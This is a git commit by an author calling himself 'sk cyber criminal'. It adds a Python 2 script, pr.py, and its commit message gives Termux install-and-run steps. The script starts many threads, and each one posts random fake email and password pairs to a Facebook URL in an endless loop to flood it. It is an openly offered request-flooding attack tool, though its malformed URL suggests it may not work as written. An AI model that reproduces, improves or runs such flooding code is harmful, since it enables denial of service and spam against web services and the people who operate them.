5f2282e45e78bec9584fada4bdc3506d5f217b6d
sk cyber criminal <111014390+skcayber@users.noreply.github.com>
2022-09-09 07:30:28 +0600

    pr.py
    pkg update 
    pkg upgrade 
    pkg install python 
    pkg install python2 
    pkg install git 
    git clone https://github.com/skcayber/pr.git
    cd pr
    python pr.py

---
+++ pr.py
@@ -0,0 +1,34 @@
+import urllib
+import urllib2 
+import random
+import string
+from threading import Thread
+import sys
+
+'''
+the number of threads
+'''
+num = int (sys.argv[1])
+
+def attack():
+	while True:
+		data = {
+		    'email': id_generator(random.randint(3,10))+"@"+id_generator(random.randint(3,10))+".com",
+		    'password': id_generator(random.randint(3,10)),
+		}
+		req = urllib2.Request(url="facebook.com",
+		                      data=urllib.urlencode(data), 
+		                      headers={"Content-type": "application/x-www-form-urlencoded"}) 
+		response = urllib2.urlopen(req)
+		the_page = response.read()
+		print 'flooeded with '+ str(data)
+
+def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
+	return ''.join(random.choice(chars) for _ in range(size))
+
+if __name__ == "__main__":
+    for k in range(0, num):
+        thread = Thread(target = attack)
+        thread.start()
+        print 'Launched thread '+str(k)
+        print 
